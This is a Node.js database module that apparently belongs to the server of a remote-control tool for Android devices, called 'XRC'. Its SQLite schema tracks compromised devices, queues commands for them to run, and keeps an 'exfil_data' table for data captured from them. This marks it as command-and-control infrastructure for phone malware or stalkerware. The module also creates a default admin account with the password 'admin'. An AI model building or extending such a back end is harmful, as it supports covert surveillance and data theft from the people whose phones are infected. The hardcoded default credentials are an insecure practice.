// ============================================================
// FILE: XRC/server/src/db/database.js
// ============================================================
const path = require('path');
const fs = require('fs');
const Database = require('better-sqlite3');

let db = null;

function getDatabase() {
    if (db) return db;

    const dbPath = process.env.DB_PATH || path.join(__dirname, '..', '..', 'data', 'xrc.db');
    const dbDir = path.dirname(dbPath);

    if (!fs.existsSync(dbDir)) {
        fs.mkdirSync(dbDir, { recursive: true });
    }

    db = new Database(dbPath);
    db.pragma('journal_mode = WAL');
    db.pragma('foreign_keys = ON');
    db.pragma('synchronous = NORMAL');
    db.pragma('cache_size = -64000');

    return db;
}

async function initDatabase() {
    const db = getDatabase();

    db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'operator',
            created_at INTEGER DEFAULT (strftime('%s','now')),
            last_login INTEGER
        );

        CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY,
            device_id TEXT UNIQUE NOT NULL,
            alias TEXT,
            model TEXT,
            manufacturer TEXT,
            android_version TEXT,
            sdk_version INTEGER,
            first_seen INTEGER DEFAULT (strftime('%s','now')),
            last_seen INTEGER DEFAULT (strftime('%s','now')),
            ip_address TEXT,
            country TEXT,
            network_type TEXT,
            battery_level INTEGER,
            is_online INTEGER DEFAULT 0,
            tags TEXT DEFAULT '[]',
            notes TEXT,
            group_name TEXT DEFAULT 'default'
        );

        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            action TEXT NOT NULL,
            payload TEXT,
            status TEXT DEFAULT 'pending',
            priority TEXT DEFAULT 'normal',
            created_at INTEGER DEFAULT (strftime('%s','now')),
            executed_at INTEGER,
            completed_at INTEGER,
            result TEXT,
            error TEXT,
            FOREIGN KEY (device_id) REFERENCES devices(device_id)
        );

        CREATE TABLE IF NOT EXISTS exfil_data (
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            type TEXT NOT NULL,
            data TEXT,
            file_path TEXT,
            file_size INTEGER,
            checksum TEXT,
            captured_at INTEGER DEFAULT (strftime('%s','now')),
            received_at INTEGER DEFAULT (strftime('%s','now')),
            tags TEXT DEFAULT '[]',
            FOREIGN KEY (device_id) REFERENCES devices(device_id)
        );

        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            user_id TEXT NOT NULL,
            token TEXT NOT NULL,
            expires_at INTEGER NOT NULL,
            created_at INTEGER DEFAULT (strftime('%s','now')),
            FOREIGN KEY (user_id) REFERENCES users(id)
        );

        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            level TEXT DEFAULT 'info',
            source TEXT,
            message TEXT,
            data TEXT,
            created_at INTEGER DEFAULT (strftime('%s','now'))
        );

        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL,
            updated_at INTEGER DEFAULT (strftime('%s','now'))
        );

        CREATE INDEX IF NOT EXISTS idx_commands_device ON commands(device_id);
        CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
        CREATE INDEX IF NOT EXISTS idx_exfil_device ON exfil_data(device_id);
        CREATE INDEX IF NOT EXISTS idx_exfil_type ON exfil_data(type);
        CREATE INDEX IF NOT EXISTS idx_devices_online ON devices(is_online);
        CREATE INDEX IF NOT EXISTS idx_logs_created ON logs(created_at);
    `);

    // Create default admin user if none exists
    const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
    if (userCount.count === 0) {
        const bcrypt = require('bcryptjs');
        const { v4: uuidv4 } = require('uuid');
        const hash = await bcrypt.hash('admin', 12);

        db.prepare('INSERT INTO users (id, username, password_hash, role) VALUES (?, ?, ?, ?)').run(
            uuidv4(), 'admin', hash, 'admin'
        );
        console.log('[DB] Default admin user created (username: admin, password: admin)');
    }

    console.log('[DB] Database initialized');
    return db;
}

function closeDatabase() {
    if (db) {
        db.close();
        db = null;
    }
}

module.exports = { getDatabase, initDatabase, closeDatabase };
